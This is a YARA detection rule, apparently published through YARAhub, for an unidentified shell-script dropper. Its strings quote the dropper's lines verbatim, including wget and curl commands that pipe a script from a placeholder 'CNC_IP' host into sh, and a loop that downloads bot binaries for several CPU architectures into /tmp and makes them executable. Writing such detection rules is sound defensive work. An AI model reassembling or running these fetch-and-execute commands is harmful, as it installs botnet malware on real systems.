rule SCRIPT_Dropper_Unknown_ForgeAuto_b9f33ec7
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-02"
        reference_sha256 = "b9f33ec7975260a08cefb2604a39f1e52e84ebada9fc07c3a39a5e4fd75d933e"
        yarahub_uuid = "e9ac9817-4226-4250-be90-0ff317e63a8e"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "13c0c457be26c386bc46c17498132776"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "export POC_ALLOW_VM=\"${POC_ALLOW_VM:-1}\"" ascii
        $s1 = "if command -v wget >/dev/null 2>&1; then" ascii
        $s2 = "${POC_ALLOW_VM:-1}" ascii
        $s3 = "Super-simple drop tester: try each arch until one runs." ascii
        $s4 = "wget -qO- http://CNC_IP/drop-simple.sh | sh" ascii
        $s5 = "wget -qO- http://CNC_IP/drop-simple.sh | sh -s -- http://CNC_IP" ascii
        $s6 = "curl -fsSL http://CNC_IP/drop-simple.sh | sh -s -- http://1.2.3.4" ascii
        $s7 = "Optional arg: BASE URL (http://CNC_IP). If omitted, uses baked BASE below." ascii
        $s8 = "if [ -z \"$BASE\" ]; then" ascii
        $s9 = "for ARCH in bot aarch64 armv7l armv5l armv4l i686 mipsel mips mips64; do" ascii
        $s10 = "OUT=\"/tmp/d-${ARCH}-$$\"" ascii
        $s11 = "wget -q -O \"$OUT\" \"${BASE}/${ARCH}\" 2>/dev/null && OK=1" ascii
        $s12 = "elif command -v curl >/dev/null 2>&1; then" ascii
        $s13 = "curl -fsSL \"${BASE}/${ARCH}\" -o \"$OUT\" 2>/dev/null && OK=1" ascii
        $s14 = "elif command -v busybox >/dev/null 2>&1; then" ascii
        $s15 = "busybox wget -q -O \"$OUT\" \"${BASE}/${ARCH}\" 2>/dev/null && OK=1" ascii
        $s16 = "if [ \"$OK\" != 1 ] || [ ! -s \"$OUT\" ]; then" ascii
        $s17 = "if [ \"$SZ\" -lt 256 ]; then" ascii
        $s18 = "chmod +x \"$OUT\" || { rm -f \"$OUT\"; continue; }" ascii
        $s19 = "[drop-simple] need BASE: sh drop-simple.sh http://CNC_IP" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2, $s3, $s4, $s5, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s6)
}
